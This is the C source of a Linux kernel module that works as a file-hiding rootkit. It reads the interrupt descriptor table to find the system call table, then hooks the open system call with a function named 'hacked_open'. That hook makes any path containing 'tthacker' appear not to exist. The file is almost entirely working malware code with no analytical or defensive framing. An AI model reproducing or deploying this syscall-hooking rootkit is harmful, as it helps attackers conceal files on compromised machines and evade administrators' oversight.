#ifndef MODULE
#define MODULE
#endif
                                                                              
#ifndef __KERNEL__
#define __KERNEL__
#endif

#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
struct descriptor_idt
{
        unsigned short offset_low;
        unsigned short ignore1;
        unsigned short ignore2;
        unsigned short offset_high;
};

static struct 
{
        unsigned short limit;
        unsigned long base;
}__attribute__ ((packed)) idt48;
 
static unsigned int SYS_CALL_TABLE_ADDR;
void **sys_call_table;
int base_system_call;
int (*orig_open)(const char *pathname,int flag,mode_t mode);
unsigned char opcode_call[3]={0xff,0x14,0x85};

int match(unsigned char *source)
{
        int i;
        for(i=0;i<3;i++)
	{
                if(source[i] != opcode_call[i])
                        return 0;
        }
        return 1;
}

int get_sys_call_table(void)
{
        int i,j;
        unsigned char *ins=(unsigned char *)base_system_call;
        unsigned int sct;
                                                                              
        for(i=0;i<100;i++)
	{
                if(ins[i]==opcode_call[0])
		{
                        if(match(ins+i))
			{
                                sct=*((unsigned int *)(ins+3+i));
                                printk(KERN_ALERT "sys_call_tabl's address is 0x%X\n",sct);
                                return sct;
                        }
                }
        }
                                                                              
        printk(KERN_ALERT "can't find the address of sys_call_table\n");
        return -1;
}

int hacked_open(const char *pathname,int flag,mode_t mode)
{
 	char *hide="tthacker";
 
	if(strstr(pathname,hide)!=NULL)
 	{
  		printk(KERN_ALERT "find name.\n");
  		return -ENOENT;
 	}

 	else
 	{
  	        return orig_open(pathname,flag,mode);
 	}
}

int init_module(void)
{
        __asm__ volatile ("sidt %0": "=m" (idt48));
        struct descriptor_idt *pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);
        base_system_call = (pIdt80->offset_high<<16 | pIdt80->offset_low);
        printk(KERN_ALERT "system_call address at 0x%x\n",base_system_call);
        SYS_CALL_TABLE_ADDR=get_sys_call_table();
        sys_call_table=(void **)SYS_CALL_TABLE_ADDR;
        orig_open=sys_call_table[__NR_open];
	sys_call_table[__NR_open]=hacked_open;
        return 0;
}

void cleanup_module()
{
        sys_call_table[__NR_open]=orig_open;
}
